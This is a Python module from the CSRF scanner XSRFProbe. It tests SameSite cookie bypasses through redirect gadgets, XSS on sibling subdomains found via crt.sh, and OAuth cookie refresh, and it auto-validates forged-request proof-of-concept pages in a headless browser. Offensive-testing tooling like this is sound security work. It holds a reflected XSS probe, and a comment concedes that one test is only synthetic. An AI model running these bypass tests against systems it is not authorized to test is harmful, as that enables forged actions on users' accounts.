#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# -:-:-:-:-:-:-::-:-:#
#    XSRF Probe     #
# -:-:-:-:-:-:-::-:-:#

# Author: 0xInfection
# This module requires XSRFProbe
# https://github.com/0xInfection/XSRFProbe

import re
import logging
import requests
from urllib.parse import urlparse, urlencode

from xsrfprobe.core.browser import BrowserSession
from xsrfprobe.core.request import requestMaker, SESSION
from xsrfprobe.core.diff import DiffEngine
from xsrfprobe.core.logger import VulnLogger, NovulLogger, testProgress
from xsrfprobe.core.schema import BenchmarkResult
from xsrfprobe.modules.Generator import gen_post_autosubmit, gen_get_img
from xsrfprobe.files import config

logger = logging.getLogger("Browser")


class BrowserCSRFTests:
    def __init__(self, browser: BrowserSession):
        self.browser = browser
        self.diff = DiffEngine()

    # SameSite=Strict bypass via client-side redirect gadget
    def testSameSiteStrictClientRedirect(self, url: str, _benchmark: BenchmarkResult, method: str, params: dict) -> bool:
        """
        Discover open-redirect / client-redirect gadgets on target, then use them
        to navigate the browser from within the target origin, bypassing SameSite=Strict.
        """
        logger.info("[S2] Testing SameSite=Strict bypass via client-side redirect gadget...")

        resp = requestMaker(url)
        if not resp:
            return False

        redirect_patterns = [
            r'window\.location\s*=\s*[\'"]([^\'"]+)[\'"]',
            r'window\.location\.href\s*=\s*[\'"]([^\'"]+)[\'"]',
            r'document\.location\s*=\s*[\'"]([^\'"]+)[\'"]',
            r'<meta\s+http-equiv=["\']refresh["\']\s+content=["\']\d+;\s*url=([^"\']+)["\']',
            r'window\.location\.replace\([\'"]([^\'"]+)[\'"]\)',
        ]

        redirect_gadgets = []
        for pattern in redirect_patterns:
            matches = re.findall(pattern, resp.text, re.I)
            redirect_gadgets.extend(matches)

        scripts = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', resp.text, re.I)
        for script_url in scripts:
            if script_url.startswith("/"):
                parsed = urlparse(url)
                script_url = f"{parsed.scheme}://{parsed.netloc}{script_url}"
            try:
                sr = requestMaker(script_url)
                if sr:
                    for pattern in redirect_patterns[:3]:
                        matches = re.findall(pattern, sr.text, re.I)
                        redirect_gadgets.extend(matches)
            except Exception:
                continue

        parsed_target = urlparse(url)
        redirect_params = ["url", "redirect", "next", "return", "returnUrl", "goto",
                          "redirect_uri", "continue", "dest", "destination", "redir"]

        for param_name in redirect_params:
            test_url = f"{parsed_target.scheme}://{parsed_target.netloc}/redirect?{param_name}={url}"
            r = requestMaker(test_url)
            if r and (r.is_redirect or r.status_code in (301, 302, 303, 307, 308)):
                redirect_gadgets.append(test_url)

        if not redirect_gadgets:
            logger.info("[S2] No client-side redirect gadgets found.")
            return False

        for gadget_url in redirect_gadgets[:5]:
            logger.info("[S2] Testing redirect gadget: %s", gadget_url)

            csrf_url = f"{url}?{urlencode(params)}" if method.upper() == "GET" else url
            gadget_test_url = f"{parsed_target.scheme}://{parsed_target.netloc}/redirect?url={csrf_url}"

            if method.upper() == "GET":
                poc_path = gen_get_img(gadget_test_url, params)
            else:
                poc_path = gen_post_autosubmit(gadget_test_url, params)

            result = self.browser.open_poc_file(poc_path)

            final_url = result.get("final_url", "")
            if final_url and url in final_url:
                logger.warning("[S2] VULNERABLE: Client-side redirect bypassed SameSite=Strict.")
                VulnLogger(url, f"SameSite=Strict bypassed via redirect gadget: {gadget_url}", test_id="S2")
                return True

        logger.info("[S2] Client-side redirect bypass failed.")
        return False

    # SameSite=Strict bypass via sibling subdomain XSS
    # this is a basic scaffold, we do not test for XSS and this is a purely synthetic test for the sake of completeness
    # TODO: inform the user about this limitation in a future iteration
    def testSameSiteStrictSiblingDomain(self, url: str, _benchmark: BenchmarkResult, method: str, params: dict) -> bool:
        """
        Enumerate sibling subdomains via crt.sh, probe for reflected XSS,
        and use it to forge requests from the target origin.
        """
        if not config.ENUM_SUBDOMAINS:
            logger.info("[S3] Subdomain enumeration disabled (--enum-subdomains not set).")
            return False

        logger.info("[S3] Testing SameSite=Strict bypass via sibling subdomain...")

        parsed = urlparse(url)
        domain = parsed.netloc
        parts = domain.split(".")
        if len(parts) >= 2:
            base_domain = ".".join(parts[-2:])
        else:
            base_domain = domain

        subdomains = self.enumerateSubdomains(base_domain)
        subdomains = [s for s in subdomains if s != domain]

        if not subdomains:
            logger.info("[S3] No sibling subdomains found.")
            return False

        logger.info("[S3] Found %d sibling subdomains. Probing for XSS...", len(subdomains))

        xss_probe = '<script>alert(1)</script>'
        for subdomain in subdomains[:10]:
            test_url = f"{parsed.scheme}://{subdomain}/?q={xss_probe}"
            try:
                r = requestMaker(test_url)
                if r and xss_probe in r.text:
                    logger.warning("[S3] VULNERABLE: Reflected XSS found on sibling: %s", subdomain)
                    VulnLogger(url, f"SameSite=Strict bypassable via XSS on sibling subdomain: {subdomain}", test_id="S3")
                    return True
            except Exception:
                continue

        logger.info("[S3] No reflected XSS on sibling subdomains.")
        return False

    def enumerateSubdomains(self, domain: str) -> list[str]:
        """Enumerate subdomains using crt.sh certificate transparency."""
        logger.info("Enumerating subdomains for %s via crt.sh...", domain)
        subdomains = set()

        try:
            resp = requests.get(
                f"https://crt.sh/?q=%.{domain}&output=json",
                timeout=15
            )
            if resp.status_code == 200:
                entries = resp.json()
                for entry in entries:
                    name_value = entry.get("name_value", "")
                    for name in name_value.split("\n"):
                        name = name.strip().lstrip("*.")
                        if name and name.endswith(domain):
                            subdomains.add(name)
        except Exception as e:
            logger.error("crt.sh lookup failed: %s", e)

        logger.info("Found %d unique subdomains.", len(subdomains))
        return list(subdomains)

    # SameSite=Lax cookie refresh bypass
    def testSameSiteLaxCookieRefresh(self, url: str, _benchmark: BenchmarkResult, _method: str, _params: dict) -> bool:
        """
        Detect cookies set without explicit SameSite attribute (browser defaults to Lax).
        If the app has an OAuth/SSO flow that refreshes cookies, a cross-site POST
        within 120s of cookie issuance bypasses Lax.
        """
        logger.info("[S4] Testing SameSite=Lax cookie refresh bypass...")

        resp = requestMaker(url)
        if not resp:
            return False

        no_samesite_cookies = []
        for h_name, h_val in resp.headers.items():
            if h_name.lower() == "set-cookie":
                if "samesite" not in h_val.lower():
                    cookie_name = h_val.split("=")[0].strip()
                    no_samesite_cookies.append(cookie_name)

        if not no_samesite_cookies:
            logger.info("[S4] All cookies have explicit SameSite attribute.")
            return False

        logger.info("[S4] Cookies without explicit SameSite: %s", no_samesite_cookies)

        oauth_patterns = [
            r'/oauth', r'/auth/callback', r'/login/oauth', r'/sso',
            r'/auth/redirect', r'/openid', r'/saml',
        ]

        has_oauth = False
        for pattern in oauth_patterns:
            if re.search(pattern, resp.text, re.I):
                has_oauth = True
                break

        if not has_oauth:
            links = re.findall(r'href=["\']([^"\']*(?:oauth|auth|sso|login)[^"\']*)["\']', resp.text, re.I)
            if links:
                has_oauth = True

        if has_oauth:
            logger.warning("[S4] VULNERABLE: Cookies default to Lax + OAuth flow detected.")
            logger.warning("[S4] Cross-site POST within 120s of OAuth cookie refresh bypasses SameSite=Lax.")
            VulnLogger(url, "SameSite=Lax bypass via cookie refresh: cookies lack explicit SameSite + OAuth flow present.", test_id="S4")
            return True

        logger.info("[S4] No OAuth/SSO cookie refresh flow detected.")
        NovulLogger(url, "No SameSite=Lax cookie refresh bypass vector found.")
        return False

    # Auto-validation: open PoC file in browser and check result
    def autoValidatePoC(self, poc_path: str, url: str, benchmark: BenchmarkResult) -> bool:
        """
        Open a generated PoC HTML file in the headless browser,
        let it auto-submit, then check if the action succeeded.
        """
        logger.info("Auto-validating PoC: %s", poc_path)

        self.browser.sync_all_cookies(SESSION, url)
        result = self.browser.open_poc_file(poc_path)

        if "error" in result:
            logger.error("PoC validation failed: %s", result["error"])
            return False

        final_url = result.get("final_url", "")
        logger.info("PoC landed on: %s", final_url)

        # If the browser is still on the PoC file:// URL or an iframe-wrapped page,
        # the form likely submitted into an iframe — try switching to it
        page_source = result.get("page_source", "")
        if final_url.startswith("file://"):
            iframe_source = self.browser.get_iframe_source()
            if iframe_source:
                page_source = iframe_source

        if self.diff.benchmarkPassed(benchmark, page_source, benchmark.status_code):
            logger.warning("PoC VALIDATED: Action was accepted by the server.")
            VulnLogger(url, f"Auto-validated PoC: {poc_path}")
            return True

        logger.info("PoC did not produce the expected result. Validation inconclusive.")
        return False

    def runAllBrowserTests(self, url: str, benchmark: BenchmarkResult,
                           method: str, params: dict) -> dict:
        """Run all browser-dependent tests. Returns dict of test results."""
        self.browser.sync_all_cookies(SESSION, url)

        results = {}

        tests = [
            ("S2", "SameSite=Strict redirect gadget", self.testSameSiteStrictClientRedirect),
            ("S3", "SameSite=Strict sibling XSS", self.testSameSiteStrictSiblingDomain),
            ("S4", "SameSite=Lax cookie refresh", self.testSameSiteLaxCookieRefresh),
        ]

        for test_id, description, test_fn in tests:
            try:
                with testProgress(logger, test_id, description) as tp:
                    result = test_fn(url, benchmark, method, params)
                    results[test_id] = result
                    if result:
                        tp["status"] = "VULNERABLE"
                    else:
                        tp["status"] = "not vulnerable"
            except Exception as e:
                logger.error("Browser test %s failed: %s", test_id, e)
                results[test_id] = False

        return results
